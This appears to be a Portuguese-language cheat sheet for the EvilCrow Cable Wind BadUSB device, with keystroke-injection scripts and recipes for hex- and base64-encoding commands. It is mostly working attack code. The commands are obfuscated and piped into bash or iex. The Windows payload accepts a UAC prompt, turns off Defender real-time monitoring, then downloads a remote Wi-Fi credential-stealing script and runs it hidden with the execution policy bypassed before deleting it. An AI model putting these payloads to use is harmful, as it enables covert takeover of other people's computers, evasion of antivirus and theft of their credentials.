# Seçãp destinada ao EvilCrow Cable Wind


## Padrão para executar comandos em qualquer layout de Teclado:
### No Linux
```bash
Delay 2000
CtrlAltT
Delay 1000

Print echo
Press KEY_SPACE

Press KEY_LEFT_CTRL
Press KEY_LEFT_SHIFT
Press u
Release
Print 0027
PressRelease KEY_ENTER

Delay 200
Print COMANDO-EM-HEXA

Press KEY_LEFT_CTRL
Press KEY_LEFT_SHIFT
Press u
Release
Print 0027
PressRelease KEY_ENTER

PrintLine | xxd -r -p | bash
Delay 200
PrintLine exit
```

### No Windows
```bash
Delay 1000
GuiR
WinPrintLine powershell
Delay 1000


```

## Convertendo Comando para Hexa

### Usanando o xxd
#### No Linux

Convertendo o comando para o código:
```bash
echo -n 'COMANDO_AQUI' | xxd -p  
```
ou (MELHOR)
```bash
cat <<'EOF' | xxd -p
COMANDO_AQUI
EOF
```

Decodificar 
```bash
echo -n 'SUA_STRING_HEX_AQUI' | xxd -r -p
```

Para usar o comando 'ls'
```bash
xxd -r -p <<< 'SUA_STRING_HEX_AQUI' | sh
```
ou
```bash
echo 'SUA_STRING_HEX_AQUI' | xxd -r -p | bash
```

#### No Windows
Executar o Comando
```bash
iex(-join('COD_HEX'-split'(?<=\G..)'|%{[char][int]"0x$_"}))
```

### Usando o PowerShell - EncodedCommand 

#### No windows
##### Code
```bash
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('COMANDO_AQUI'))
```
#### Decode
```bash
[System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SUA_STRING_ENCODED_AQUI'))
```

#### No Linux
##### Code
```bash
echo -n 'COMANDO_AQUI' | iconv -t UTF-16LE | base64 -w 0
```
##### Decode
```bash
echo -n 'SUA_STRING_ENCODED_AQUI' | base64 -d | iconv -f UTF-16LE -t UTF-8
```
##### Usando

Abre o CMD (Win + R)

```bash
powershell -e bABzAA==%   
```

## Executar Script Remoto
### Linux
### Windows
```bash
Delay 1000
GuiR
WinPrintLine powershell Start-Process powershell -Verb runAs
Delay 100
Press KEY_LEFT_ALT
Press Y
Release
Delay 1000
Press KEY_LEFT_ARROW
PressRelease KEY_ENTER
Release

WinPrintLine Set-MpPreference -DisableRealtimeMonitoring $true

WinPrintLine $d=New-Object Net.WebClient;$u='https://raw.githubusercontent.com/blinhares/bruce-sd-card/c158900b573debf0747dd2bfddcb4b68ccaa968a/BadUSB/Payloads/Credentials/Wifi/WinPwd/script.ps1';$f='t.ps1';$d.DownloadFile($u,$f);powershell -w h -ep Bypass -c "gc $f -Raw|iex";rm $f -ea 0;exit



```